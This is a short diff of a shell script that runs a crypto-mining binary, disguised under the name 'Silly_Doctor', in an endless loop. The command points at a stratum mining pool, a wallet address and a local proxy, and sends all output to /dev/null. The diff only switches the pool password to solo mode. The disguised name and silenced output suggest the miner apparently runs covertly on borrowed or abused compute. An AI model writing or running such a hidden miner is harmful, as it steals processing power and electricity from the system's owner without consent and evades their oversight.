@@ -137,6 +137,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm aurum --pool stratum-na.rplant.xyz:7109 --wallet BE68QAyJA16B2QgtFPKjXZyuQTJJmLEm48.$currentdate --password webpassword=IhatePopUps --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
+./Silly_Doctor --disable-gpu --algorithm aurum --pool stratum-na.rplant.xyz:7109 --wallet BE68QAyJA16B2QgtFPKjXZyuQTJJmLEm48.$currentdate --password webpassword=IhatePopUps,m=solo --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 10
 done
